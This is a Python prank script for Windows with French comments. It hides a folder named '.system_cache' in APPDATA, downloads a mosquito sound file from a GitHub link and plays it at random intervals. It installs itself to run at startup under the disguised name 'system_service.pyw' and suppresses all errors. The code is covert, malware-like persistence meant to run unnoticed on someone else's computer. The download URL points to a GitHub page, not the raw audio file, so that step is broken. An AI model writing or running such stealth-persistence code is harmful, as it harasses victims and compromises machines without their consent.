import os
import random
import time
import urllib.request
import winsound
from threading import Thread

def download_and_play():
    # Création du dossier système camouflé
    hidden_dir = os.path.join(os.getenv('APPDATA'), '.system_cache')
    sound_file = os.path.join(hidden_dir, 'system_sound.wav')  # Changé en .wav pour winsound

    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)

    # Téléchargement discret du fichier audio
    if not os.path.exists(sound_file):
        url = "https://github.com/7ShIkI3/Troll/blob/main/bruitage%20moustique.wav"  # Assurez-vous d'avoir un .wav
        urllib.request.urlretrieve(url, sound_file)

    while True:
        delay = random.randint(300, 3600)  # Délai entre 5min et 1h
        time.sleep(delay)

        # Lecture du son avec winsound
        winsound.PlaySound(sound_file, winsound.SND_FILENAME)

def autostart():
    # Installation au démarrage
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    startup_link = os.path.join(startup_path, 'system_service.pyw')

    if not os.path.exists(startup_link):
        with open(startup_link, 'w') as f:
            f.write(f'import os; os.system("pythonw {script_path}")')

# Lancement des fonctions principales
if __name__ == "__main__":
    try:
        autostart()  # Installation au démarrage
        sound_thread = Thread(target=download_and_play)
        sound_thread.daemon = True
        sound_thread.start()
        while True:
            time.sleep(1)
    except Exception as e:
        pass